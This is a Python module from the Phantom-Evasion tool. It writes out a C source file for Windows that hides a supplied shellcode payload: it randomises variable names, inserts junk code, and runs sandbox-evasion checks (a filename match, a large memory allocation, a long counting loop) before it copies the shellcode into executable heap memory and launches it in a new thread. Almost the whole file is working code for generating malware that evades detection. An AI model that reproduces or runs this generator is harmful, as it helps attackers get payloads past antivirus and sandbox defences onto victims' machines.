
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import random, string
import sys 
from random import shuffle
sys.path.append("Modules/payloads/auxiliar")
import usefull

Payload = sys.argv[1]

Filename = sys.argv[2]

Randbufname = usefull.varname_creator()

Payload = Payload.replace("buf",Randbufname)

Randgood = usefull.varname_creator()

Randmem = usefull.varname_creator()

Randbig = random.randrange(60000000,120000000,1000000) 	

Randmaxop = usefull.varname_creator()

Randcpt	= usefull.varname_creator()

Randi =	usefull.varname_creator()

Randlpv = usefull.varname_creator()

Randhand = usefull.varname_creator()

Randresult = usefull.varname_creator()

Randthread = usefull.varname_creator()

Randheapvar = usefull.varname_creator()
 
y=[[i] for i in range(1,6)]

shuffle(y)
aa=str(y[0])
bb=str(y[1])
cc=str(y[2])
aa=aa.replace("[","")
aa=aa.replace("]","")
bb=bb.replace("[","")
bb=bb.replace("]","")
cc=cc.replace("[","")
cc=cc.replace("]","")

Junkcode1 = usefull.Junkmathinject(aa) 	        # Junkcode
Junkcode2 = usefull.Junkmathinject(bb)		# Junkcode
Junkcode3 = usefull.Junkmathinject(cc)		# Junkcode


Hollow_code = ""
Hollow_code += "#define " + Randgood + " " + str(Randbig) + "\n"
Hollow_code += "#include <windows.h>\n"
Hollow_code += "#include <stdio.h>\n"
Hollow_code += "#include <string.h>\n"
Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += "if (strstr(argv[0], \"" + Filename + ".exe\") > 0){\n"
Hollow_code += "char *" + Randmem + " = NULL;\n"
Hollow_code += Randmem + " = (char *) malloc("+ Randgood + ");\n"
Hollow_code += "if ("+ Randmem + "!=NULL){\n"
Hollow_code += "memset(" + Randmem + ",00," + Randgood + ");\n"
Hollow_code += "free(" + Randmem + ");\n"
Hollow_code += "int " + Randcpt + "  = 0;\n"
Hollow_code += "int " + Randi + " = 0;\n"
Hollow_code += "for("+ Randi + " = 0;" + Randi + " < " + Randgood + "; " + Randi + "++){\n"
Hollow_code += Randcpt + "++;}\n"
Hollow_code += "if("+ Randcpt + " == " + Randgood + "){\n"
Hollow_code += "HANDLE " + Randheapvar + ";LPVOID " + Randlpv + ";HANDLE " + Randhand + ";DWORD " + Randresult + ";DWORD " + Randthread + ";\n"
Hollow_code += Payload
Hollow_code += Randheapvar + " = HeapCreate(0x00040000, strlen(" + Randbufname + "), 0);\n"
Hollow_code += Randlpv + " = HeapAlloc(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n" 
Hollow_code += "else{" + Junkcode1 + "}\n"
Hollow_code += "}else{" + Junkcode2 + "}\n"
Hollow_code += "}else{" + Junkcode3 + "}\n"
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)


